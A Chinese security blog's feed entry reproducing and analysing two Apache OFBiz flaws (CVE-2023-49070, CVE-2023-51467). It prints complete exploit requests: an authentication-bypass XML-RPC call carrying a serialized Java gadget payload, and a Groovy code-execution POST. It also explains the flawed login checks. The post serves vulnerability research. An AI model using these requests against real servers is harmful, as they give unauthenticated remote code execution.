    <id>http://boogipop.com/2024/03/10/CVE-2023-49070_CVE-2023-51467%20Apache%20OfBiz%20%E9%89%B4%E6%9D%83%E7%BB%95%E8%BF%87RCE/</id>
    <published>2024-03-10T03:14:28.000Z</published>
    <updated>2024-03-10T03:14:28.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2023-49070"><a href="#CVE-2023-49070" class="headerlink" title="CVE-2023-49070"></a>CVE-2023-49070</h1><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache ofbiz applications &lt; 18.12.10 due to xml-rpc java deserialzation bug.</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>准备一下18.12.9版本的OfBiz，然后把环境搭建起来。POC和之前的2020大差不差，看一下报文</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/webtools/control/xmlrpc/;/?USERNAME=&amp;PASSWORD=s&amp;requirePasswordChange=Y</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8443</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=5ACF0B44F3B88D25DA3ADD9C4AFB59FB.jvm1; Phpstorm-b3ad9363=84c4b31e-d5ed-4379-9a80-9b7507cedf1e; Pycharm-69800360=084fccb6-8efb-4ce0-ab83-e9ee9ec90c09; confluence.browse.space.cookie=space-blogposts; sidebar_collapsed=false; Goland-7a35ec7=48e3d45f-8c3b-456a-b871-9a45c9c01e45; cookie_token=ca76b89a250a514dd21370f8310865e199423e79b5b53392404ae1bb2ab24a8c; Phpstorm-b3ad9726=1202f496-542d-4162-91ec-bad957f445b9; lang=zh-cn; device=desktop; theme=default; OFBiz.Visitor=10000</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Sec-Ch-Ua</span><span class="punctuation">: </span>&quot;Chromium&quot;;v=&quot;122&quot;, &quot;Not(A:Brand&quot;;v=&quot;24&quot;, &quot;Microsoft Edge&quot;;v=&quot;122&quot;</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>none</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>1697</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">methodCall</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">methodName</span>&gt;</span>ProjectDiscovery<span class="tag">&lt;/<span class="name">methodName</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">params</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">param</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">value</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">struct</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">member</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>test<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">value</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">              <span class="tag">&lt;<span class="name">serializable</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://ws.apache.org/xmlrpc/namespaces/extensions&quot;</span>&gt;</span>rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LjoYjqcyKkSAIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgA/b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmNvbXBhcmF0b3JzLkNvbXBhcmFibGVDb21wYXJhdG9y+/SZJbhusTcCAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AARMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAABdXIAAltCrPMX+AYIVOACAAB4cAAAAVnK/rq+AAAAMQAZAQABYQcAAQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHAAMBAAY8aW5pdD4BAAMoKVYBAARDb2RlBwADDAAFAAYKAAgACQEAEWphdmEvbGFuZy9SdW50aW1lBwALAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwADQAOCgAMAA8BAARjYWxjCAARAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAEwAUCgAMABUBAApTb3VyY2VGaWxlAQAGYS5qYXZhACEAAgAEAAAAAAABAAEABQAGAAEABwAAABoAAgABAAAADiq3AAq4ABASErYAFlexAAAAAAABABcAAAACABhwdAAIYm9vZ2lwb3BwdwEAeHEAfgANeA==<span class="tag">&lt;/<span class="name">serializable</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;/<span class="name">member</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">struct</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">param</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">params</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">methodCall</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>很快就知道这其实应该是个权限绕过，他的后半部分rpc是没修复的<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1710039371298-527941d8-4bae-4723-b142-388bbfb0945d.png#averageHue=%235d8173&clientId=u093e4bd1-db97-4&from=paste&height=676&id=u6fc33de3&originHeight=845&originWidth=1164&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=98295&status=done&style=none&taskId=ub37e4fd6-68ee-447b-a942-6ce9fff1ba6&title=&width=931.2" alt="image.png"><br>因此我们需要分析一下鉴权的逻辑了。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>作了2层防护，首先多了一个CacheFilter进行过滤。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1710039506414-7e09bb68-6d0c-4ba0-b852-008a0abdfb71.png#averageHue=%232e323a&clientId=u093e4bd1-db97-4&from=paste&height=718&id=ub0090933&originHeight=898&originWidth=1613&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=232109&status=done&style=none&taskId=u4513e14f-6e74-4748-ab98-e4e77fdc464&title=&width=1290.4" alt="image.png"><br>对之前payload中的<code>/control/xmlrpc</code>进行了过滤。并且对body中的serializable进行了检测，从这里其实看得出来修复人员是乱jb修复的。但凡你把2个检测分开写而不是写在一个if里，都不至于绕了。我们绕过也很简单，用分号去绕<br>然后修复人员对xmlrpc做了一个鉴权处理，把上次的false改为了true，因此要进入鉴权流程<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1710039660829-4126b6f2-24ed-4729-9be0-68721d1e08be.png#averageHue=%232c3037&clientId=u093e4bd1-db97-4&from=paste&height=730&id=uef91b8ff&originHeight=913&originWidth=1618&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=253357&status=done&style=none&taskId=u157edd75-f266-4294-bc7c-eb2983dbeda&title=&width=1294.4" alt="image.png"><br><code>requestMap.securityAuth</code>为true。因此会反射调用checklogin方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">checkLogin</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">        <span class="type">GenericValue</span> <span class="variable">userLogin</span> <span class="operator">=</span> checkLogout(request, response);</span><br><span class="line">        <span class="comment">// have to reget this because the old session object will be invalid</span></span><br><span class="line">        <span class="type">HttpSession</span> <span class="variable">session</span> <span class="operator">=</span> request.getSession();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (userLogin == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// check parameters</span></span><br><span class="line">            username = request.getParameter(<span class="string">&quot;USERNAME&quot;</span>);</span><br><span class="line">            password = request.getParameter(<span class="string">&quot;PASSWORD&quot;</span>);</span><br><span class="line">            token = request.getParameter(<span class="string">&quot;TOKEN&quot;</span>);</span><br><span class="line">            <span class="comment">// check session attributes</span></span><br><span class="line">            <span class="keyword">if</span> (username == <span class="literal">null</span>) username = (String) session.getAttribute(<span class="string">&quot;USERNAME&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (password == <span class="literal">null</span>) password = (String) session.getAttribute(<span class="string">&quot;PASSWORD&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (token == <span class="literal">null</span>) token = (String) session.getAttribute(<span class="string">&quot;TOKEN&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// in this condition log them in if not already; if not logged in or can&#x27;t log in, save parameters and return error</span></span><br><span class="line">            <span class="keyword">if</span> (username == <span class="literal">null</span></span><br><span class="line">                    || (password == <span class="literal">null</span> &amp;&amp; token == <span class="literal">null</span>)</span><br><span class="line">                    || <span class="string">&quot;error&quot;</span>.equals(login(request, response))) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// make sure this attribute is not in the request; this avoids infinite recursion when a login by less stringent criteria (like not checkout the hasLoggedOut field) passes; this is not a normal circumstance but can happen with custom code or in funny error situations when the userLogin service gets the userLogin object but runs into another problem and fails to return an error</span></span><br><span class="line">                request.removeAttribute(<span class="string">&quot;_LOGIN_PASSED_&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// keep the previous request name in the session</span></span><br><span class="line">                session.setAttribute(<span class="string">&quot;_PREVIOUS_REQUEST_&quot;</span>, request.getPathInfo());</span><br><span class="line"></span><br><span class="line">                <span class="comment">// <span class="doctag">NOTE:</span> not using the old _PREVIOUS_PARAMS_ attribute at all because it was a security hole as it was used to put data in the URL (never encrypted) that was originally in a form field that may have been encrypted</span></span><br><span class="line">                <span class="comment">// keep 2 maps: one for URL parameters and one for form parameters</span></span><br><span class="line">                Map&lt;String, Object&gt; urlParams = UtilHttp.getUrlOnlyParameterMap(request);</span><br><span class="line">                <span class="keyword">if</span> (UtilValidate.isNotEmpty(urlParams)) &#123;</span><br><span class="line">                    session.setAttribute(<span class="string">&quot;_PREVIOUS_PARAM_MAP_URL_&quot;</span>, urlParams);</span><br><span class="line">                &#125;</span><br><span class="line">                Map&lt;String, Object&gt; formParams = UtilHttp.getParameterMap(request, urlParams.keySet(), <span class="literal">false</span>);</span><br><span class="line">                <span class="keyword">if</span> (UtilValidate.isNotEmpty(formParams)) &#123;</span><br><span class="line">                    session.setAttribute(<span class="string">&quot;_PREVIOUS_PARAM_MAP_FORM_&quot;</span>, formParams);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//if (Debug.infoOn()) Debug.logInfo(&quot;checkLogin: PathInfo=&quot; + request.getPathInfo(), module);</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Allow loggingOut when impersonated</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isLoggingOut</span> <span class="operator">=</span> <span class="string">&quot;logout&quot;</span>.equals(RequestHandler.getRequestUri(request.getPathInfo()));</span><br><span class="line">        <span class="comment">//Check if the user has an impersonation in process</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">authoriseLoginDuringImpersonate</span> <span class="operator">=</span> EntityUtilProperties.propertyValueEquals(<span class="string">&quot;security&quot;</span>, <span class="string">&quot;security.login.authorised.during.impersonate&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!isLoggingOut &amp;&amp; !authoriseLoginDuringImpersonate &amp;&amp; checkImpersonationInProcess(request, response) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">//remove error message that will be displayed in impersonated status screen</span></span><br><span class="line">            request.removeAttribute(<span class="string">&quot;_ERROR_MESSAGE_LIST_&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;impersonated&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>我们看到这一点<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1710039710222-c52e8119-8058-4418-a740-ab010e643417.png#averageHue=%23383d4b&clientId=u093e4bd1-db97-4&from=paste&height=207&id=ud371586c&originHeight=259&originWidth=1234&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=60475&status=done&style=none&taskId=u8cfe6c0b-82c0-435f-99e1-31069dcee84&title=&width=987.2" alt="image.png"><br>这一段其实很奇怪，error判断成为了绕过的关键点，我们只需要让login的返回值不为error，并且passwd赋值，username不赋值，我们就绕过了鉴权。我们跟进login方法<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1710039754309-df3adc8c-e291-4d52-af7e-7d4c8b6343b1.png#averageHue=%232f343e&clientId=u093e4bd1-db97-4&from=paste&height=462&id=u5a326e59&originHeight=578&originWidth=1318&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=149606&status=done&style=none&taskId=u9a3d18ac-6d8f-462d-967b-335b762f026&title=&width=1054.4" alt="image.png"><br>只需要加上个<code>requirePasswordChange=Y</code>就绕过了登录鉴权了。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1710039783498-b494fd27-4958-4d8b-862c-31fa6f75b154.png#averageHue=%232f333a&clientId=u093e4bd1-db97-4&from=paste&height=694&id=ub1d4ee1a&originHeight=867&originWidth=1855&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=356369&status=done&style=none&taskId=u09c41b28-73ab-4566-9f5b-5b33ecd28b8&title=&width=1484" alt="image.png"><br>最终回归到熟悉的Xml解析最后反序列化。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1710039820348-6425ffc8-94c8-4566-a05e-fe5a00810be1.png#averageHue=%232b2f35&clientId=u093e4bd1-db97-4&from=paste&height=594&id=uffe75b27&originHeight=743&originWidth=1378&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=136092&status=done&style=none&taskId=uda4220b2-9560-43ba-b294-b65d6fb868a&title=&width=1102.4" alt="image.png"></p><h1 id="CVE-2023-51467"><a href="#CVE-2023-51467" class="headerlink" title="CVE-2023-51467"></a>CVE-2023-51467</h1><h2 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache ofbiz applications &lt; &#x3D;18.12.10 due to xml-rpc java deserialzation bug.<br>多了个版本，在18.12.10中，官方移除了xmrpc组件，但是鉴权问题仍然存在，咱就是说不能一起修了。</p><h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /webtools/control/ProgramExport/?USERNAME=&amp;PASSWORD=&amp;requirePasswordChange=Y HTTP/<span class="number">1.1</span></span><br><span class="line">Host: localhost:<span class="number">8443</span></span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Accept-Language: en-US;q=0.9,en;q=0.8</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Cache-Control: max-age=0</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Content-Length: 57</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">groovyProgram=throw+new+Exception(&#x27;calc&#x27;.execute().text);</span></span><br></pre></td></tr></table></figure><p>这一个是用groovy表达式rce，配合鉴权绕过，那么就可以访问任意接口，因此rce的可能性还是那么大。</p><h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>鉴权部分就一样了。groovy执行部分如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!parameters.groovyProgram) &#123;</span><br><span class="line">    groovyProgram = <span class="string">&#x27;&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">// Use the List variable recordValues to fill it with GenericValue maps.</span></span><br><span class="line"><span class="string">// full groovy syntaxt is available</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">import org.apache.ofbiz.entity.util.EntityFindOptions</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// example:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// find the first three record in the product entity (if any)</span></span><br><span class="line"><span class="string">EntityFindOptions findOptions = new EntityFindOptions()</span></span><br><span class="line"><span class="string">findOptions.setMaxRows(3)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">List products = delegator.findList(&quot;Product&quot;, null, null, null, findOptions, false)</span></span><br><span class="line"><span class="string">if (products != null) &#123;</span></span><br><span class="line"><span class="string">    recordValues.addAll(products)</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line">    parameters.groovyProgram = groovyProgram</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    groovyProgram = parameters.groovyProgram</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Add imports for script.</span></span><br><span class="line"><span class="type">def</span> <span class="variable">importCustomizer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ImportCustomizer</span>()</span><br><span class="line">importCustomizer.addImport(<span class="string">&quot;org.apache.ofbiz.entity.GenericValue&quot;</span>)</span><br><span class="line">importCustomizer.addImport(<span class="string">&quot;org.apache.ofbiz.entity.model.ModelEntity&quot;</span>)</span><br><span class="line"><span class="type">def</span> <span class="variable">configuration</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CompilerConfiguration</span>()</span><br><span class="line">configuration.addCompilationCustomizers(importCustomizer)</span><br><span class="line"></span><br><span class="line"><span class="type">Binding</span> <span class="variable">binding</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Binding</span>()</span><br><span class="line">binding.setVariable(<span class="string">&quot;delegator&quot;</span>, delegator)</span><br><span class="line">binding.setVariable(<span class="string">&quot;recordValues&quot;</span>, recordValues)</span><br><span class="line"></span><br><span class="line"><span class="type">ClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader()</span><br><span class="line"><span class="type">def</span> <span class="variable">shell</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GroovyShell</span>(loader, binding, configuration)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (UtilValidate.isNotEmpty(groovyProgram)) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// Check if a webshell is not uploaded but allow &quot;import&quot;</span></span><br><span class="line">        <span class="keyword">if</span> (!SecuredUpload.isValidText(groovyProgram, [<span class="string">&quot;import&quot;</span>])) &#123;</span><br><span class="line">            logError(<span class="string">&quot;================== Not executed for security reason ==================&quot;</span>)</span><br><span class="line">            request.setAttribute(<span class="string">&quot;_ERROR_MESSAGE_&quot;</span>, <span class="string">&quot;Not executed for security reason&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">        shell.parse(groovyProgram)</span><br><span class="line">        shell.evaluate(groovyProgram)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1710040379934-63b1f9df-ec43-4a47-bed3-b21a952a66d5.png#averageHue=%232b2f37&clientId=u093e4bd1-db97-4&from=paste&height=538&id=uca7d2f55&originHeight=672&originWidth=1493&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=159701&status=done&style=none&taskId=ua0a4b715-706e-40f5-b2af-fc2ea8da3ec&title=&width=1194.4" alt="image.png"><br>获取groovyparam然后执行。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1710040392531-c700620f-6947-4670-afe2-39d60400a34e.png#averageHue=%232b313b&clientId=u093e4bd1-db97-4&from=paste&height=51&id=u57fbe1e7&originHeight=64&originWidth=763&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=11205&status=done&style=none&taskId=u5351e684-9407-4b91-b823-20356f23a76&title=&width=610.4" alt="image.png"></p>]]></content>
    
    
    <summary type="html">NONE</summary>
    
    
    
    <category term="At Dawn" scheme="http://boogipop.com/categories/At-Dawn/"/>
    
    
    <category term="Java" scheme="http://boogipop.com/tags/Java/"/>
    
    <category term="CVE" scheme="http://boogipop.com/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-9496 Apache OfBiz 反序列化命令执行漏洞</title>
    <link href="http://boogipop.com/2024/03/08/CVE-2020-9496%20Apache%20OfBiz%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <id>http://boogipop.com/2024/03/08/CVE-2020-9496%20Apache%20OfBiz%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</id>
    <published>2024-03-08T12:03:56.000Z</published>
    <updated>2024-03-08T12:03:56.000Z</updated>
    
